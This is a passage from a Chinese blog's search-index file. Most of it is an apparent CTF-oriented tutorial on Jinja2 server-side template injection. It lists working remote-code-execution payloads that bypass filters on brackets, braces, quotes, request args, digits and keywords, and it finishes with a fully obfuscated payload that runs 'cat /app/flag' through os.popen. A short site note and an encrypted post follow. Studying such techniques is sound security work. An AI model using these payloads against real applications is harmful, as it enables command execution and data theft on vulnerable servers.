vim">&#123;% <span class="hljs-keyword">set</span> <span class="hljs-keyword">sb</span> = dict(aaaaaaaaaaaaaaaaaa=<span class="hljs-keyword">a</span>) | <span class="hljs-keyword">join</span> | <span class="hljs-built_in">count</span> %&#125;<br>&#123;% <span class="hljs-keyword">set</span> <span class="hljs-keyword">pop</span>=dict(<span class="hljs-keyword">pop</span>=<span class="hljs-keyword">a</span>)|<span class="hljs-keyword">join</span>%&#125;<br>&#123;% <span class="hljs-keyword">set</span> xiahuaxian = (lipsum | <span class="hljs-built_in">string</span> | <span class="hljs-keyword">list</span>) | attr(<span class="hljs-keyword">pop</span>)(<span class="hljs-keyword">sb</span>) %&#125;<br><br>小标按照实际情况写<br></code></pre></td></tr></table></figure><h2 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过 []"></a>绕过 []</h2><p>经常有中括号被ban的情况出现，这个时候可以使用<code>pop</code>或<code>__getitem__()</code>代替索引中的&#96;[]，它的作用简单说就是可以把中括号转换为括号的形式，举个例子</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-emphasis">__bases__</span>[0]=<span class="hljs-emphasis">__bases__</span>.<span class="hljs-emphasis">__getitem__</span>(0)<br></code></pre></td></tr></table></figure>## 绕过{{}}有时候为了防止SSTI，可能程序员会ban掉{{，这个时候我们可以利用jinja2的语法，用{%来进行RCE，举个例子我们平常使用的payload<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]. __subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;dir&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>修改后的payload</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">&#123;%print(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>]. <span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">138</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read())%&#125;<br></code></pre></td></tr></table></figure><p>也可以借助for循环和if语句来执行命令</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&#123;%for i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%print i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;<br></code></pre></td></tr></table></figure><h2 id="绕过单引号双引号-传参绕过"><a href="#绕过单引号双引号-传参绕过" class="headerlink" title="绕过单引号双引号   传参绕过"></a>绕过单引号双引号   传参绕过</h2><p>过滤了单、双引号，有两种方法绕过</p><p>request绕过</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">#post</span><br><span class="language-xml"># __builtins__</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[80].__init__.__globals__.__builtins__[request.values.arg1](<span class="hljs-name">request.values.arg2</span>).popen(<span class="hljs-name">request.values.arg3</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=__import__,arg2=os,arg3=popen</span><br><span class="language-xml"></span><br><span class="language-xml"># popen</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[132].__init__.__globals__[request.values.arg1](<span class="hljs-name">request.values.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br><span class="language-xml"># os</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[213].__init__.__globals__[request.values.arg1].popen(<span class="hljs-name">request.values.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#cookie</span><br><span class="language-xml"># popen</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[132].__init__.__globals__[request.cookies.arg1](<span class="hljs-name">request.cookies.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Cookie:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p>chr()绕过</p><p>先找出chr函数位置</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&#123;&#123;().<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__mro__</span>[-1].<span class="hljs-emphasis">__subclasses__</span>()[0].<span class="hljs-emphasis">__init__</span>.<span class="hljs-emphasis">__globals__</span>.<span class="hljs-emphasis">__builtins__</span>.chr&#125;&#125;<br></code></pre></td></tr></table></figure>{%set%}拼接绕过   适合大部分过滤<h2 id="绕过args"><a href="#绕过args" class="headerlink" title="绕过args"></a>绕过args</h2><p>当使用args的方法绕过<code>&#39;</code>和<code>&quot;</code>时，可能遇见args被ban的情况，这个时候可以采用<code>request.cookies</code>和<code>request.values</code>，他们利用的方式大同小异，示例如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">GET:&#123;&#123;url_for.__globals__<span class="hljs-selector-attr">[request.cookies.a]</span>&#125;&#125;<br>COOkie: <span class="hljs-string">&quot;a&quot;</span> :<span class="hljs-string">&#x27;__builtins__&#x27;</span><br></code></pre></td></tr></table></figure>使用{%set%}拼接绕过<h2 id="绕过数字"><a href="#绕过数字" class="headerlink" title="绕过数字"></a>绕过数字</h2><p>有时候可能会遇见数字<code>0-9</code>被ban的情况，这个时候我们可以通过count来得到数字，举个例子</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">dict</span>(<span class="hljs-name">e</span>=a)|join|count)&#125;&#125;</span><span class="language-xml">  #获得字典拼接后字符串的长度</span><br></code></pre></td></tr></table></figure><h2 id="绕过关键字"><a href="#绕过关键字" class="headerlink" title="绕过关键字"></a>绕过关键字</h2><p>有时候可能遇见<code>class</code>、<code>base</code>这种关键词被绕过的情况，我们这个时候通常使用的绕过方式是使用join拼接从而实现绕过，举个例子</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">dict</span>(<span class="hljs-name">__in</span>=a,<span class="hljs-attr">it__</span>=a)|join&#125;&#125;</span><span class="language-xml">  =__init__</span><br></code></pre></td></tr></table></figure><h1 id="SSTI实战"><a href="#SSTI实战" class="headerlink" title="SSTI实战"></a>SSTI实战</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">目的<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br>payload:<br>&#123;% <span class="hljs-built_in">set</span> s = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> si = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> sb = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> <span class="hljs-attribute">pop</span>=dict(pop=a)|join%&#125;<br>&#123;% <span class="hljs-built_in">set</span> xiahuaxian = (lipsum | string | list) | attr(pop)(sb) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> a = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">glo</span>=a, <span class="hljs-attribute">bals</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> b = dict(<span class="hljs-attribute">o</span>=a, <span class="hljs-attribute">s</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> c = dict(<span class="hljs-attribute">po</span>=a, <span class="hljs-attribute">pen</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> d = dict(<span class="hljs-attribute">re</span>=a, <span class="hljs-attribute">ad</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> e = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">get</span>=a, <span class="hljs-attribute">item</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> f = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">buil</span>=a, <span class="hljs-attribute">tins</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> ch = dict(<span class="hljs-attribute">ch</span>=a, <span class="hljs-attribute">r</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> chh = lipsum | attr(a) | attr(e)(f) | attr(e)(ch) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> cmd = (dict(<span class="hljs-attribute">ca</span>=a, <span class="hljs-attribute">t</span>=a) | join, chh(s), chh(si), dict(<span class="hljs-attribute">ap</span>=a, <span class="hljs-attribute">p</span>=a) | join, chh(si), dict(<span class="hljs-attribute">fl</span>=a, <span class="hljs-attribute">ag</span>=a) | join) | join %&#125;<br>&#123;&#123; lipsum | attr(a) | attr(e)(b) | attr(c)(cmd) | attr(d)() &#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>问自己</title>
    <link href="/tuyi/2025/01/19/%E9%97%AE%E8%87%AA%E5%B7%B1/"/>
    <url>/tuyi/2025/01/19/%E9%97%AE%E8%87%AA%E5%B7%B1/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="8275b6c9fc77850b0007d474e3d4e3b563da2a959e67b558795dc27422b81c70">7389a4e37e9dabc8af72228f567f583b1f9ba4b4aa0b937c90aaff86783f2f4cdc7fe0a2e060dc0fb69e0cfed97c5b2b02307e944f85197c10783a2e08b2ebab38f98c0635854736a7d4db8057147550382529547668fab013ade34f08eb873f4dfe405f4d5985ee706239b30f02b95c1e5cfe6be76c8cc844a2ce36f2afb02b1e4370944671f31986fac2146df9065a82e0db0d7d7754d95577499610e7d55b4db5e048307c3a119d14afa15db89d7796106ec767db66ecbf296ccd51ebec5b85d06521eb6672e74ebdb6b080b9ddd2079dd70a60c93ae9c6c31b3e4dc1019e48826abb08a06e7906f06427791b012adad6bfb36447f3206a6c421d39dffb2ec14024d056d0fc713c7ec6b790b8bb529c7b580fdb9ef82693bac3aa8aa2fc2d0bbbe11e3c418272b5cecbea4324cdbf9641e7fd455c2e10fc650df7f1a67bbe3003c435abcfbaafa6fb651c663806b571c78e9f8d45769d20ee999b4ed90585a9e69543e488880081374a78c64c4e984c24f71c66ff351882845be8a65f22c3569748c41e52a544e54a5c2a0c33c599217f07aea603c7a56d131ecb8593faa7f9654e2a6edc3ad74c09b04deab036ddb41dd202149ed60c8acc4eaa4a868f1d009df742e4ea103f8838074a4180ad038f09e7db4b546d7772190cff232c4c80dcad18f5d930d007afa2bb1eefceffa183b2b765009431851485d4b71d2194696af02dbb65e20caecdcb1c9c4c219de964d4bc57e8db004bf9e9f4abaa87c63bcf8f25c1b3bc403374090a6ffc4264d9ebc250a382bdabbb8f8889c946ee677b0f682acc22da1d847cc8faa3a30783db44ff527f1173fe78bf19587039e57a3a5d71312b5290632ef680733a6b15762e465f8341d5aa86f68624d9c1d135a186139c6b319f297b61c0ce963c238976a592703a2fbf20b3ec22b9f510a4fa39eefcb37fbd6db69ccf47bd3c14ad681060738b60ba78e67940feb5baff30b98303131f31b90748c766e6bcedc18a95e825</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/tuyi/lib/hbe.js"></script><link href="/tuyi/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>目标</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>开站</title>
    <link href="/tuyi/2024/11/12/%E5%BC%80%E7%AB%99/"/>
    <url>/tuyi/2024/11/12/%E5%BC%80%E7%AB%99/</url>
    
    <content type="html"><![CDATA[<p>搭建一个小站，纪录自己的学习和分享一些东西</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
